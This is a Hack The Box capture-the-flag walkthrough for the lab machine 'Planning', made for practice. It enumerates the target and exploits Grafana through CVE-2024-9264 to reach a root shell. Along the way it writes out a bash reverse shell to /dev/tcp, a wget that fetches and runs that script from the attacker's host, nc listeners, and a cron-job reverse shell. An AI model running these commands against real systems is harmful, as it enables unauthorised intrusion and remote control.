# HTB Walkthrough — Machine: Planning

**Target IP:** `10.10.11.68`  
**Author:** Miguel Reis
**OS:** Linux

---

## 1. Initial Nmap Scan

We begin with a standard Nmap scan to identify open ports and running services.

```bash
sudo nmap -sC -sV 10.10.11.68 --open
```

### Nmap Results:

![[Pasted image 20250610232515.png]]

---

## 2. Website Enumeration

Navigating to `http://10.10.11.68` in a browser redirects to `http://planning.htb`, suggesting the use of virtual hosting.

To fix this, add the hostname to your local `/etc/hosts` file:

```bash
sudo nano /etc/hosts
```

Add:

```
10.10.11.68    planning.htb
```

Now visiting `http://planning.htb` reveals a webpage that appears to be an **online courses portal**.

---

## 3. Directory and VHost Enumeration

After basic directory bruteforcing yielded no significant results, we switched to **vhost enumeration**, which checks for subdomains using a wordlist.

```bash
gobuster vhost -u http://planning.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt --append-domain
```

### Result:

```
Found: grafana.planning.htb [Status: 302] [--> /login]
```

This indicates the presence of a **Grafana instance** accessible at:

```
http://grafana.planning.htb
```

To access it, add it to your `/etc/hosts` file:

```
10.10.11.68    planning.htb grafana.planning.htb
```
---

## 4. Grafana Access

Now navigating to `http://grafana.planning.htb` takes you to a **Grafana login page**.

We login using the credentials provided by HTB:

`admin:0D5oT70Fq13EvB5r`

The current version is Grafana v11.0.0
![[Pasted image 20250610234122.png]]

Searching for vulnerabilities in this version we come across **CVE-2024-9264** and we can use https://github.com/nollium/CVE-2024-9264/blob/main/CVE-2024-9264.py to test the vulnerability.

We can clone the repo and use the `CVE-2024-9264.py` script:

```
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -f /etc/passwd http://grafana.planning.htb
```

We confirm the script works, meaning the target is vulnerable.

---
## 5. Getting a Reverse Shell

We then create a reverse shell script to be executed in the target:

```
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.159/8022 0>&1
```

We can use the same script to execute commands in the target using the `-c` flag.

```
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "wget http://10.10.14.159:8081/mrev.sh"  http://grafana.planning.htb
```

We make it executable:

```
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "chmod +x mrev.sh"  http://grafana.planning.htb
```

We start a listener on port `8022` as in the reverse shell:
```
nc -nlvp 8022
```

And then execute the script on the target machine:

```
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "./mrev.sh"  http://grafana.planning.htb
```

On our listener we get a shell:
![[Pasted image 20250611002052.png]]


> [!NOTE] Be sure to understand we are currently inside a docker container running grafana
> We can see this by the hostname containing a 12-character ID, default in docker.
> We also have present the file `/.dockerenv` confirming our suspicions 


---
## 6. Container Enumeration

To explore further, we use [LinEnum.sh](https://github.com/rebootuser/LinEnum) to enumerate the container. The script reveals environment variables that contain credentials for a user `enzo`.
![[Pasted image 20250611003724.png]]

---

## 7. SSH into Host System

We try to use this credentials on ssh:

```
ssh enzo@10.10.11.68  
```

Successfully logging in we can find the user flag in the home directory of the user.

`cat /home/enzo/user.txt`

---
## 8. Privilege Escalation

We now use [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) to try escalate priviliges. We find the file `/opt/crontabs/crontab.db`

![[Pasted image 20250611015654.png]]

Inspecting it, we find a password used to back up the Grafana Docker image:
![[Pasted image 20250611015752.png]]

---
## 9. Accessing Internal Web Service

We notice a service is running on port 8000, which is only accessible locally.

To reach it, we set up port forwarding:

```
ssh -L 8000:localhost:8000 enzo@planning.htb
```

Then we can access it through http://localhost:8000

We are presented with a login prompt, we use the user `root` and the found password.

We successfully log in.

This turns out to be a Crontab Web UI, where we can create and manage scheduled tasks.

From here, we create a new cron job to get a reverse shell as root.
![[Pasted image 20250611020846.png]]

---

## 10. Root Access

After setting up a listener:

```
nc -nlvp 8023
```

We run the cron job from the Crontab UI and a get a root shell. Finding the root flag in the `/root` directory.

